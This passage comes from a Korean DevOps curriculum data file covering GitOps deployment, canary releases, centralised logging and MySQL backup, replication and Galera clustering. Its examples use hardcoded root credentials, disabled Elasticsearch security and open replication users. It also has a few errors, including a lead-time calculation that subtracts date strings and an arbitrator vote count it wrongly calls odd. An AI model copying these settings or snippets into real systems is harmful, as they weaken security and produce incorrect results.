            cpu: "100m"

# Staging 환경 오버레이
# overlays/staging/kustomization.yaml
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
bases:
- ../../base
namePrefix: staging-
replicas:
- name: myapp
  count: 1
images:
- name: myapp
  newTag: staging-latest

# Production 환경 오버레이
# overlays/production/kustomization.yaml
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
bases:
- ../../base
namePrefix: prod-
replicas:
- name: myapp
  count: 5
images:
- name: myapp
  newTag: v1.2.3
patchesStrategicMerge:
- resources.yaml

# overlays/production/resources.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  template:
    spec:
      containers:
      - name: myapp
        resources:
          requests:
            memory: "512Mi"
            cpu: "500m"
          limits:
            memory: "1Gi"
            cpu: "1000m"

# 적용:
kubectl apply -k overlays/staging
kubectl apply -k overlays/production`
                },
                {
                  heading: "3. Flagger로 자동 Canary 배포",
                  code: `# Flagger 설치
kubectl apply -f https://raw.githubusercontent.com/fluxcd/flagger/main/artifacts/flagger/crd.yaml
kubectl apply -f https://raw.githubusercontent.com/fluxcd/flagger/main/artifacts/flagger/deployment.yaml

# Canary 정의
# canary.yaml
apiVersion: flagger.app/v1beta1
kind: Canary
metadata:
  name: myapp
  namespace: production
spec:
  targetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: myapp
  service:
    port: 80
  analysis:
    interval: 1m
    threshold: 5
    maxWeight: 50
    stepWeight: 10
    metrics:
    - name: request-success-rate
      thresholdRange:
        min: 99
      interval: 1m
    - name: request-duration
      thresholdRange:
        max: 500
      interval: 1m
    webhooks:
    - name: load-test
      url: http://flagger-loadtester/
      timeout: 5s
      metadata:
        cmd: "hey -z 1m -q 10 -c 2 http://myapp-canary/"

# 동작:
# 1. 새 버전 배포 감지
# 2. Canary 파드 생성 (10% 트래픽)
# 3. 1분간 메트릭 측정
# 4. 성공률 99% 이상 & 응답 시간 500ms 이하면 → 20% 증가
# 5. 실패하면 → 롤백
# 6. 50%까지 증가 후 전체 전환`
                },
                {
                  heading: "4. 멀티 클러스터 배포",
                  code: `# Flux로 여러 클러스터 관리
# clusters/staging/flux-system/gotk-sync.yaml
apiVersion: source.toolkit.fluxcd.io/v1beta2
kind: GitRepository
metadata:
  name: flux-system
  namespace: flux-system
spec:
  interval: 1m
  url: https://github.com/myuser/fleet-infra
  ref:
    branch: main

# clusters/staging/apps/myapp.yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
kind: Kustomization
metadata:
  name: myapp
  namespace: flux-system
spec:
  interval: 5m
  path: ./apps/myapp/overlays/staging
  sourceRef:
    kind: GitRepository
    name: flux-system

# clusters/production-us/apps/myapp.yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
kind: Kustomization
metadata:
  name: myapp
  namespace: flux-system
spec:
  interval: 5m
  path: ./apps/myapp/overlays/production-us
  sourceRef:
    kind: GitRepository
    name: flux-system

# clusters/production-eu/apps/myapp.yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
kind: Kustomization
metadata:
  name: myapp
  namespace: flux-system
spec:
  interval: 5m
  path: ./apps/myapp/overlays/production-eu
  sourceRef:
    kind: GitRepository
    name: flux-system

# 배포 프로세스:
# 1. Git에 앱 매니페스트 업데이트
# 2. Flux가 모든 클러스터에서 감지
# 3. Staging → Production-US → Production-EU 순차 배포
# 4. 각 클러스터별로 Canary 배포 자동 실행`
                },
                {
                  heading: "5. 배포 승인 워크플로우",
                  code: `# GitHub Actions with manual approval
name: Production Deployment

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Build image
        run: docker build -t myapp:\${{ github.sha }} .
      - name: Push image
        run: docker push myapp:\${{ github.sha }}

  request-approval:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Create pull request
        uses: peter-evans/create-pull-request@v5
        with:
          title: "Deploy \${{ github.sha }} to production"
          body: |
            ## Deployment Request
            - Commit: \${{ github.sha }}
            - Author: \${{ github.actor }}
            - Tests: Passed ✅

            Please review and approve to deploy to production.
          branch: deploy/\${{ github.sha }}
          base: main

  deploy-production:
    needs: request-approval
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://myapp.com
    steps:
      - name: Update k8s manifest
        run: |
          git clone https://github.com/myuser/myapp-k8s
          cd myapp-k8s
          sed -i 's|image: myapp:.*|image: myapp:\${{ github.sha }}|' k8s/deployment.yaml
          git commit -am "Deploy \${{ github.sha }}"
          git push

      - name: Wait for ArgoCD sync
        run: |
          argocd app wait myapp --timeout 600

      - name: Smoke test
        run: |
          curl -f https://myapp.com/health || exit 1`
                },
                {
                  heading: "6. 배포 메트릭과 SLO 추적",
                  code: `# Prometheus로 배포 메트릭 수집
# deployment-exporter.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deployment-exporter
spec:
  template:
    spec:
      containers:
      - name: exporter
        image: deployment-exporter:latest
        env:
        - name: GITHUB_TOKEN
          valueFrom:
            secretKeyRef:
              name: github-token
              key: token

# Python 스크립트 (deployment-exporter)
import requests
from prometheus_client import start_http_server, Gauge
import time

DEPLOYMENT_FREQUENCY = Gauge('deployment_frequency', 'Deployments per day')
LEAD_TIME = Gauge('deployment_lead_time_seconds', 'Time from commit to deploy')
MTTR = Gauge('deployment_mttr_seconds', 'Mean time to recovery')
CHANGE_FAILURE_RATE = Gauge('deployment_change_failure_rate', 'Failed deployments %')

def collect_metrics():
    # GitHub API로 배포 정보 수집
    response = requests.get(
        'https://api.github.com/repos/myuser/myapp/actions/runs',
        headers={'Authorization': f'token {GITHUB_TOKEN}'}
    )

    runs = response.json()['workflow_runs']

    # 배포 빈도 계산
    deployments_today = len([r for r in runs if is_today(r['created_at'])])
    DEPLOYMENT_FREQUENCY.set(deployments_today)

    # Lead Time 계산
    for run in runs:
        if run['conclusion'] == 'success':
            lead_time = (run['updated_at'] - run['created_at']).total_seconds()
            LEAD_TIME.set(lead_time)
            break

if __name__ == '__main__':
    start_http_server(8000)
    while True:
        collect_metrics()
        time.sleep(60)

# Grafana 대시보드
# 1. Deployment Frequency: 하루 평균 배포 횟수
# 2. Lead Time: 커밋부터 배포까지 평균 시간
# 3. MTTR: 장애 복구 평균 시간
# 4. Change Failure Rate: 배포 실패율`
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "ArgoCD로 GitOps 구현 후 Git push만으로 배포 자동화",
                    "Kustomize로 Staging/Production 환경 분리하여 각각 다른 설정 적용",
                    "Flagger로 Canary 배포 자동화 (성공률 99% 이상일 때만 진행)",
                    "3개 클러스터 (Staging, US, EU)에 순차 배포 구현",
                    "배포 메트릭 (빈도, Lead Time, MTTR) Prometheus + Grafana로 추적"
                  ]
                }
              ]
            }
          }
        },
        {
          id: '4-2',
          name: '로그 관리와 분석',
          goal: '로그를 체계적으로 관리하고 인사이트를 얻을 수 있다',
          hours: 12,
          keywords: ['log management', 'centralized logging', 'log analysis'],
          tasks: [
            '중앙 집중식 로그 시스템 구축',
            '로그 검색 및 분석',
            '알림 규칙 설정'
          ],
          content: {
            beginner: {
              title: "초급: 구조화된 로깅과 기본 분석",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "구조화된 로그를 작성하고, 로그 레벨을 적절히 사용할 수 있다."
                },
                {
                  heading: "1. 좋은 로그 vs 나쁜 로그",
                  code: `// 나쁜 로그
console.log("Error");
console.log("User logged in");
console.log("Data:", data);

// 좋은 로그 (Winston 사용)
const winston = require('winston');

const logger = winston.createLogger({
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'app.log' })
  ]
});

logger.error('Database connection failed', {
  error: err.message,
  userId: req.user.id,
  timestamp: new Date().toISOString()
});

logger.info('User login successful', {
  userId: user.id,
  ip: req.ip,
  userAgent: req.headers['user-agent']
});`
                },
                {
                  heading: "2. 로그 레벨 활용",
                  code: `// ERROR: 즉시 조치 필요
logger.error('Payment processing failed', {
  orderId: 12345,
  amount: 100,
  error: 'Gateway timeout'
});

// WARN: 주의 필요
logger.warn('API rate limit approaching', {
  remaining: 10,
  limit: 100
});

// INFO: 중요 이벤트
logger.info('Order completed', {
  orderId: 12345,
  userId: 789
});

// DEBUG: 개발 디버깅용
logger.debug('Query executed', {
  sql: 'SELECT * FROM users WHERE id = ?',
  params: [123],
  duration: '15ms'
});`
                },
                {
                  heading: "💡 초급 실습 과제",
                  checklist: [
                    "Winston으로 구조화된 로그 시스템 구축",
                    "로그 레벨별로 다른 파일에 저장 (error.log, combined.log)",
                    "요청/응답 미들웨어로 모든 API 호출 로깅"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 중앙 집중식 로그 시스템 (ELK Stack)",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "Elasticsearch + Kibana로 로그를 중앙에서 관리하고 검색할 수 있다."
                },
                {
                  heading: "1. Docker Compose로 ELK Stack 구성",
                  code: `# docker-compose.yml
version: '3.8'
services:
  elasticsearch:
    image: elasticsearch:8.11.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    ports:
      - "9200:9200"

  kibana:
    image: kibana:8.11.0
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200

  logstash:
    image: logstash:8.11.0
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    ports:
      - "5000:5000"

# logstash.conf
input {
  tcp {
    port => 5000
    codec => json
  }
}

output {
  elasticsearch {
    hosts => ["elasticsearch:9200"]
    index => "app-logs-%{+YYYY.MM.dd}"
  }
}`
                },
                {
                  heading: "2. 애플리케이션에서 Logstash로 전송",
                  code: `const winston = require('winston');
require('winston-logstash');

const logger = winston.createLogger({
  transports: [
    new winston.transports.Logstash({
      port: 5000,
      host: 'localhost',
      node_name: 'my-app'
    })
  ]
});

logger.info('User action', {
  userId: 123,
  action: 'purchase',
  amount: 100
});`
                },
                {
                  heading: "⚡ 중급 실습 과제",
                  checklist: [
                    "ELK Stack Docker Compose로 구축",
                    "애플리케이션 로그를 Logstash로 전송",
                    "Kibana에서 실시간 로그 검색 및 대시보드 생성"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: 분산 추적과 로그 상관관계",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "OpenTelemetry로 분산 추적을 구현하고, 로그와 트레이스를 연결할 수 있다."
                },
                {
                  heading: "1. OpenTelemetry 통합",
                  code: `const { NodeSDK } = require('@opentelemetry/sdk-node');
const { getNodeAutoInstrumentations } = require('@opentelemetry/auto-instrumentations-node');
const { JaegerExporter } = require('@opentelemetry/exporter-jaeger');

const sdk = new NodeSDK({
  traceExporter: new JaegerExporter({
    endpoint: 'http://localhost:14268/api/traces',
  }),
  instrumentations: [getNodeAutoInstrumentations()],
});

sdk.start();

// 로그와 Trace ID 연결
const trace = require('@opentelemetry/api').trace;

app.use((req, res, next) => {
  const span = trace.getActiveSpan();
  const traceId = span?.spanContext().traceId;

  req.logger = logger.child({ traceId });
  next();
});`
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "OpenTelemetry + Jaeger로 분산 추적 구현",
                    "로그에 Trace ID 포함하여 요청 전체 추적",
                    "Grafana Loki로 로그 집계 및 알림 설정"
                  ]
                }
              ]
            }
          }
        },
        {
          id: '4-3',
          name: '데이터베이스 고급 운영',
          goal: '데이터베이스를 전문적으로 관리할 수 있다',
          hours: 20,
          keywords: ['database replication', 'sharding', 'high availability'],
          tasks: [
            'Master-Slave 복제 구성',
            '데이터베이스 백업 자동화',
            '고가용성 클러스터 구축'
          ],
          content: {
            beginner: {
              title: "초급: 데이터베이스 백업과 복구 전략",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "정기적인 백업을 자동화하고, 다양한 복구 시나리오를 처리할 수 있다."
                },
                {
                  heading: "1. 백업 전략의 중요성",
                  content: "데이터 손실은 서비스 종료로 이어질 수 있습니다.",
                  list: [
                    "하드웨어 고장: SSD/HDD 장애로 데이터 소실",
                    "인적 오류: DROP TABLE 실수로 테이블 삭제",
                    "보안 사고: 랜섬웨어 공격으로 DB 암호화",
                    "자연재해: 데이터센터 화재/침수"
                  ]
                },
                {
                  heading: "2. 3-2-1 백업 규칙",
                  code: `# 3-2-1 백업 전략
3: 데이터의 복사본 3개 유지
2: 서로 다른 2가지 매체에 저장 (HDD + SSD, 로컬 + 클라우드)
1: 1개는 오프사이트(원격지)에 보관

# 예시:
- 원본: 운영 서버 MySQL (로컬 SSD)
- 백업 1: 같은 서버 다른 디스크 (로컬 HDD)
- 백업 2: AWS S3 (클라우드)
- 백업 3: 다른 리전 S3 (재해 복구용)`
                },
                {
                  heading: "3. mysqldump로 전체 백업",
                  code: `#!/bin/bash
# full-backup.sh

DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/var/backups/mysql"
DB_NAME="mydb"
RETENTION_DAYS=7

# 백업 디렉토리 생성
mkdir -p $BACKUP_DIR

# MySQL 전체 백업 (압축)
mysqldump -u root -p\${MYSQL_PASSWORD} \\
  --single-transaction \\
  --quick \\
  --lock-tables=false \\
  \${DB_NAME} | gzip > \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz

# 백업 파일 권한 설정
chmod 600 \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz

# 백업 성공 확인
if [ $? -eq 0 ]; then
  echo "[\$(date)] Backup successful: \${DB_NAME}_\${DATE}.sql.gz" >> /var/log/mysql-backup.log
else
  echo "[\$(date)] Backup failed!" >> /var/log/mysql-backup.log
  # Slack 알림
  curl -X POST \${SLACK_WEBHOOK} -d '{"text":"❌ DB Backup Failed!"}'
  exit 1
fi

# 오래된 백업 삭제 (7일 이상)
find \${BACKUP_DIR} -name "*.sql.gz" -mtime +\${RETENTION_DAYS} -delete

# S3 업로드
aws s3 cp \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz \\
  s3://my-backup-bucket/mysql/\${DATE}/ \\
  --storage-class STANDARD_IA

echo "[\$(date)] Backup uploaded to S3" >> /var/log/mysql-backup.log`
                },
                {
                  heading: "4. Cron으로 자동화",
                  code: `# Crontab 편집
crontab -e

# 매일 새벽 3시 전체 백업
0 3 * * * /var/scripts/full-backup.sh

# 매주 일요일 새벽 4시 다른 리전으로 복사
0 4 * * 0 aws s3 sync s3://my-backup-bucket/ s3://my-backup-dr-bucket/ --region us-west-2

# 매 6시간마다 Binary Log 백업
0 */6 * * * mysqlbinlog /var/log/mysql/mysql-bin.* | gzip > /var/backups/binlog_$(date +%Y%m%d_%H).gz

# Cron 로그 확인
tail -f /var/log/cron
tail -f /var/log/mysql-backup.log`
                },
                {
                  heading: "5. 백업 복원 절차",
                  steps: [
                    {
                      label: "전체 복원",
                      code: `# 1. 백업 파일 다운로드
aws s3 cp s3://my-backup-bucket/mysql/20240101_030000/mydb_20240101_030000.sql.gz .

# 2. 압축 해제 및 복원
gunzip mydb_20240101_030000.sql.gz
mysql -u root -p mydb < mydb_20240101_030000.sql

# 3. 확인
mysql -u root -p -e "SELECT COUNT(*) FROM mydb.users;"`
                    },
                    {
                      label: "특정 테이블만 복원",
                      code: `# 백업 파일에서 특정 테이블만 추출
zcat mydb_20240101_030000.sql.gz | sed -n '/DROP TABLE.*\`users\`/,/UNLOCK TABLES/p' > users_only.sql

# 복원
mysql -u root -p mydb < users_only.sql`
                    },
                    {
                      label: "Point-in-Time Recovery (특정 시점 복구)",
                      code: `# 시나리오: 오후 2시에 실수로 테이블 삭제, 새벽 3시 백업 있음

# 1. 새벽 3시 백업 복원
mysql -u root -p mydb < mydb_20240101_030000.sql

# 2. Binary Log로 3시~2시까지 재실행
mysqlbinlog --start-datetime="2024-01-01 03:00:00" \\
            --stop-datetime="2024-01-01 14:00:00" \\
            /var/log/mysql/mysql-bin.* | mysql -u root -p mydb

# 결과: 14시 직전 상태로 복구 완료!`
                    }
                  ]
                },
                {
                  heading: "6. 백업 테스트 자동화",
                  code: `#!/bin/bash
# test-backup.sh

LATEST_BACKUP=$(ls -t /var/backups/mysql/*.sql.gz | head -1)

# 테스트 DB에 복원
gunzip -c \${LATEST_BACKUP} | mysql -u root -p test_restore_db

# 테이블 개수 확인
TABLE_COUNT=$(mysql -u root -p -se "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='test_restore_db'")

if [ \${TABLE_COUNT} -gt 0 ]; then
  echo "[\$(date)] Backup test successful: \${TABLE_COUNT} tables restored"
else
  echo "[\$(date)] Backup test FAILED!"
  curl -X POST \${SLACK_WEBHOOK} -d '{"text":"❌ Backup Restore Test Failed!"}'
fi

# 테스트 DB 삭제
mysql -u root -p -e "DROP DATABASE test_restore_db"

# 매주 토요일 자동 테스트
# 0 5 * * 6 /var/scripts/test-backup.sh`
                },
                {
                  heading: "💡 초급 실습 과제",
                  checklist: [
                    "매일 자동 백업 스크립트 작성 및 Cron 등록",
                    "백업 파일을 S3에 자동 업로드 설정",
                    "7일 이상 된 백업 파일 자동 삭제 확인",
                    "전체 백업 파일로 복원 테스트 성공",
                    "특정 테이블만 복원하는 스크립트 작성"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: Master-Slave 복제와 읽기 분산",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "Master-Slave 복제를 구성하여 고가용성과 읽기 성능을 향상시킬 수 있다."
                },
                {
                  heading: "1. 복제(Replication)의 이점",
                  list: [
                    "고가용성: Master 장애 시 Slave를 Master로 승격",
                    "읽기 분산: Slave에서 SELECT 쿼리 처리 (성능 2~3배 향상)",
                    "백업 부하 감소: Slave에서 백업 수행 (Master 영향 없음)",
                    "지리적 분산: 지역별 Slave 배치로 지연 시간 감소"
                  ]
                },
                {
                  heading: "2. MySQL Master-Slave 설정",
                  steps: [
                    {
                      label: "Master 서버 설정",
                      code: `# /etc/mysql/my.cnf (Master)
[mysqld]
server-id = 1                    # 고유 ID
log_bin = /var/log/mysql/mysql-bin.log
binlog_do_db = mydb              # 복제할 DB
binlog_format = ROW              # ROW 방식 (안전)
expire_logs_days = 7             # Binary Log 7일 보관
max_binlog_size = 100M

# MySQL 재시작
sudo systemctl restart mysql

# 복제 사용자 생성
mysql -u root -p
CREATE USER 'repl'@'%' IDENTIFIED BY 'repl_password';
GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';
FLUSH PRIVILEGES;

# Master 상태 확인 (binlog 파일명과 위치 기록!)
SHOW MASTER STATUS;
+------------------+----------+--------------+------------------+
| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |
+------------------+----------+--------------+------------------+
| mysql-bin.000001 |      154 | mydb         |                  |
+------------------+----------+--------------+------------------+`
                    },
                    {
                      label: "Slave 서버 설정",
                      code: `# /etc/mysql/my.cnf (Slave)
[mysqld]
server-id = 2                    # Master와 다른 ID
relay-log = /var/log/mysql/mysql-relay-bin
log_bin = /var/log/mysql/mysql-bin.log
read_only = 1                    # 읽기 전용 (안전)

# MySQL 재시작
sudo systemctl restart mysql

# Master 데이터 복사 (mysqldump)
mysqldump -u root -p --master-data=2 --single-transaction mydb > master_dump.sql

# Slave에 복원
mysql -u root -p mydb < master_dump.sql

# Slave 설정
mysql -u root -p
CHANGE MASTER TO
  MASTER_HOST='192.168.1.100',           # Master IP
  MASTER_USER='repl',
  MASTER_PASSWORD='repl_password',
  MASTER_LOG_FILE='mysql-bin.000001',    # SHOW MASTER STATUS에서 확인
  MASTER_LOG_POS=154;                    # SHOW MASTER STATUS에서 확인

START SLAVE;

# Slave 상태 확인
SHOW SLAVE STATUS\\G

# 중요 필드:
# Slave_IO_Running: Yes
# Slave_SQL_Running: Yes
# Seconds_Behind_Master: 0       # 복제 지연 시간
# Last_Error: (비어있어야 함)`
                    }
                  ]
                },
                {
                  heading: "3. 애플리케이션에서 읽기/쓰기 분산",
                  code: `// Node.js에서 Master/Slave 분리
const mysql = require('mysql2/promise');

// Master Pool (쓰기 전용)
const masterPool = mysql.createPool({
  host: '192.168.1.100',
  user: 'root',
  password: 'password',
  database: 'mydb',
  connectionLimit: 10
});

// Slave Pool (읽기 전용)
const slavePool = mysql.createPool({
  host: '192.168.1.101',
  user: 'root',
  password: 'password',
  database: 'mydb',
  connectionLimit: 50  // 읽기가 많으므로 더 많은 연결
});

// 읽기 쿼리 → Slave
app.get('/api/users', async (req, res) => {
  const [users] = await slavePool.query('SELECT * FROM users');
  res.json(users);
});

// 쓰기 쿼리 → Master
app.post('/api/users', async (req, res) => {
  await masterPool.query('INSERT INTO users (name, email) VALUES (?, ?)', [
    req.body.name,
    req.body.email
  ]);
  res.json({ success: true });
});

// 여러 Slave가 있을 때 로드 밸런싱
const slaves = [
  mysql.createPool({ host: '192.168.1.101', ... }),
  mysql.createPool({ host: '192.168.1.102', ... }),
  mysql.createPool({ host: '192.168.1.103', ... })
];

function getSlavePool() {
  const index = Math.floor(Math.random() * slaves.length);
  return slaves[index];
}

app.get('/api/products', async (req, res) => {
  const pool = getSlavePool();
  const [products] = await pool.query('SELECT * FROM products');
  res.json(products);
});`
                },
                {
                  heading: "4. ProxySQL로 자동 읽기/쓰기 분리",
                  code: `# ProxySQL 설치
docker run -d --name proxysql \\
  -p 6033:6033 \\
  -p 6032:6032 \\
  proxysql/proxysql

# ProxySQL 관리 콘솔 접속
mysql -u admin -padmin -h 127.0.0.1 -P6032

# Master 추가
INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (1, '192.168.1.100', 3306);

# Slave 추가
INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (2, '192.168.1.101', 3306);
INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (2, '192.168.1.102', 3306);

# 쿼리 라우팅 규칙
INSERT INTO mysql_query_rules(active, match_pattern, destination_hostgroup, apply)
VALUES (1, '^SELECT.*FOR UPDATE', 1, 1);  # SELECT FOR UPDATE → Master

INSERT INTO mysql_query_rules(active, match_pattern, destination_hostgroup, apply)
VALUES (1, '^SELECT', 2, 1);  # SELECT → Slave

# 설정 적용
LOAD MYSQL SERVERS TO RUNTIME;
LOAD MYSQL QUERY RULES TO RUNTIME;
SAVE MYSQL SERVERS TO DISK;
SAVE MYSQL QUERY RULES TO DISK;

# 애플리케이션은 ProxySQL만 바라봄
const pool = mysql.createPool({
  host: '127.0.0.1',
  port: 6033,  # ProxySQL 포트
  user: 'root',
  password: 'password',
  database: 'mydb'
});

// 자동으로 SELECT는 Slave, INSERT/UPDATE는 Master로!
const [users] = await pool.query('SELECT * FROM users');  # → Slave
await pool.query('INSERT INTO users VALUES (...)');       # → Master`
                },
                {
                  heading: "5. 복제 지연 모니터링",
                  code: `# Prometheus Exporter for MySQL
docker run -d --name mysql-exporter \\
  -p 9104:9104 \\
  -e DATA_SOURCE_NAME="exporter:password@(slave-host:3306)/" \\
  prom/mysqld-exporter

# Prometheus 스크랩 설정 (prometheus.yml)
scrape_configs:
  - job_name: 'mysql-slave'
    static_configs:
      - targets: ['localhost:9104']

# Grafana 알림 규칙
groups:
  - name: mysql-replication
    interval: 30s
    rules:
      - alert: ReplicationLag
        expr: mysql_slave_status_seconds_behind_master > 60
        for: 5m
        annotations:
          summary: "Replication lag is {{ $value }}s"

# 수동 확인 스크립트
#!/bin/bash
LAG=$(mysql -u root -p -e "SHOW SLAVE STATUS\\G" | grep Seconds_Behind_Master | awk '{print $2}')

if [ \${LAG} -gt 60 ]; then
  echo "WARNING: Replication lag is \${LAG} seconds"
  curl -X POST \${SLACK_WEBHOOK} -d "{\"text\":\"⚠️ Replication lag: \${LAG}s\"}"
fi`
                },
                {
                  heading: "6. Slave 장애 시 자동 제외",
                  code: `# ProxySQL에서 헬스 체크 설정
UPDATE mysql_servers SET max_replication_lag = 10 WHERE hostgroup_id = 2;

# 복제 지연 10초 이상이면 자동으로 라우팅에서 제외
# 복구되면 자동으로 다시 포함

# Keepalived로 Slave VIP 관리
# /etc/keepalived/keepalived.conf
vrrp_script check_mysql {
    script "/usr/local/bin/check_mysql.sh"
    interval 2
}

vrrp_instance VI_1 {
    state MASTER
    interface eth0
    virtual_router_id 51
    priority 100
    virtual_ipaddress {
        192.168.1.200  # Slave VIP
    }
    track_script {
        check_mysql
    }
}

# check_mysql.sh
#!/bin/bash
mysql -u root -p -e "SELECT 1" > /dev/null 2>&1
if [ $? -eq 0 ]; then
  exit 0  # MySQL 정상
else
  exit 1  # MySQL 장애 → VIP를 다른 Slave로 이동
fi`
                },
                {
                  heading: "⚡ 중급 실습 과제",
                  checklist: [
                    "Master 1대 + Slave 2대 복제 구성 완료",
                    "ProxySQL로 자동 읽기/쓰기 분리 설정",
                    "복제 지연 60초 이상 시 Slack 알림 설정",
                    "Slave 장애 시 자동으로 라우팅에서 제외되는지 확인",
                    "읽기 쿼리 부하 테스트 후 Slave로 분산되는지 확인"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: Multi-Master 클러스터와 자동 페일오버",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "Galera Cluster로 고가용성 DB 클러스터를 구축하고, 자동 페일오버를 구현할 수 있다."
                },
                {
                  heading: "1. Galera Cluster 개념",
                  content: "모든 노드가 Master인 Multi-Master 동기식 복제 클러스터입니다.",
                  list: [
                    "동기식 복제: 쓰기가 모든 노드에 동시 적용 (데이터 일관성 보장)",
                    "자동 페일오버: 노드 장애 시 자동으로 클러스터에서 제외",
                    "읽기/쓰기 모두 분산: 모든 노드에서 INSERT/UPDATE 가능",
                    "제로 다운타임: 노드 추가/제거 시에도 서비스 중단 없음"
                  ]
                },
                {
                  heading: "2. Galera Cluster 구성 (MariaDB)",
                  code: `# docker-compose.yml
version: '3.8'
services:
  galera-node1:
    image: mariadb:latest
    hostname: galera-node1
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: mydb
    volumes:
      - ./node1-data:/var/lib/mysql
      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
    command: >
      --wsrep-new-cluster
      --wsrep-node-name=node1
      --wsrep-node-address=galera-node1

  galera-node2:
    image: mariadb:latest
    hostname: galera-node2
    environment:
      MYSQL_ROOT_PASSWORD: root
    volumes:
      - ./node2-data:/var/lib/mysql
      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
    command: >
      --wsrep-node-name=node2
      --wsrep-node-address=galera-node2
      --wsrep-cluster-address=gcomm://galera-node1,galera-node2,galera-node3

  galera-node3:
    image: mariadb:latest
    hostname: galera-node3
    environment:
      MYSQL_ROOT_PASSWORD: root
    volumes:
      - ./node3-data:/var/lib/mysql
      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
    command: >
      --wsrep-node-name=node3
      --wsrep-node-address=galera-node3
      --wsrep-cluster-address=gcomm://galera-node1,galera-node2,galera-node3

# galera.cnf
[mysqld]
binlog_format=ROW
default-storage-engine=innodb
innodb_autoinc_lock_mode=2
bind-address=0.0.0.0

# Galera 설정
wsrep_on=ON
wsrep_provider=/usr/lib/galera/libgalera_smm.so
wsrep_cluster_name="my-galera-cluster"
wsrep_sst_method=rsync

# 실행
docker-compose up -d

# 클러스터 상태 확인
mysql -u root -p -e "SHOW STATUS LIKE 'wsrep_cluster_size'"
# wsrep_cluster_size | 3  ← 3개 노드 정상`
                },
                {
                  heading: "3. HAProxy로 로드 밸런싱 + 헬스 체크",
                  code: `# haproxy.cfg
global
    log stdout format raw local0

defaults
    log     global
    mode    tcp
    option  tcplog
    timeout connect 10s
    timeout client 30s
    timeout server 30s

# MySQL 읽기/쓰기 분산
listen mysql-cluster
    bind *:3306
    mode tcp
    option mysql-check user haproxy_check
    balance roundrobin
    server galera-node1 galera-node1:3306 check
    server galera-node2 galera-node2:3306 check
    server galera-node3 galera-node3:3306 check

# HAProxy 통계 페이지
listen stats
    bind *:8404
    stats enable
    stats uri /
    stats refresh 10s

# docker-compose.yml에 추가
  haproxy:
    image: haproxy:latest
    volumes:
      - ./haproxy.cfg:/usr/local/etc/haproxy/haproxy.cfg
    ports:
      - "3306:3306"
      - "8404:8404"
    depends_on:
      - galera-node1
      - galera-node2
      - galera-node3

# 헬스 체크 사용자 생성 (각 노드에서)
CREATE USER 'haproxy_check'@'%';
FLUSH PRIVILEGES;

# 애플리케이션은 HAProxy만 바라봄
const pool = mysql.createPool({
  host: 'haproxy',  # HAProxy
  port: 3306,
  user: 'root',
  password: 'root',
  database: 'mydb'
});

// 어느 노드에 연결되든 상관없이 쓰기/읽기 모두 가능
await pool.query('INSERT INTO users ...');  # 모든 노드에 동기 복제
const [users] = await pool.query('SELECT * FROM users');  # 어느 노드에서든 읽기`
                },
                {
                  heading: "4. 자동 Split-Brain 방지",
                  code: `# Split-Brain: 네트워크 단절로 클러스터가 2개로 분리되는 현상

# 방지 방법 1: 쿼럼 (Quorum) 설정
# 과반수 노드가 살아있어야만 쓰기 허용
# 3노드 → 최소 2노드, 5노드 → 최소 3노드

# galera.cnf에 추가
wsrep_provider_options="pc.ignore_quorum=false;pc.ignore_sb=false"

# 테스트: 2개 노드 다운 시
docker-compose stop galera-node2 galera-node3

# node1에서 쓰기 시도
mysql -u root -p -e "INSERT INTO users VALUES (1, 'test')"
# ERROR: WSREP has not yet prepared node for application use
# → 쿼럼 부족으로 자동 읽기 전용 전환!

# 방지 방법 2: Arbitrator (중재자) 추가
# 데이터 없이 투표만 참여하는 경량 노드
docker run -d --name garbd \\
  --network mynet \\
  severalnines/garbd \\
  --address gcomm://galera-node1,galera-node2,galera-node3 \\
  --group my-galera-cluster

# 효과: 홀수 투표권 확보 (3노드 + 1 arbitrator = 4표)
# 2노드 다운 → 1노드 + arbitrator = 2표 (과반수 미달, 쓰기 차단)`
                },
                {
                  heading: "5. Point-in-Time Recovery (PITR) 구현",
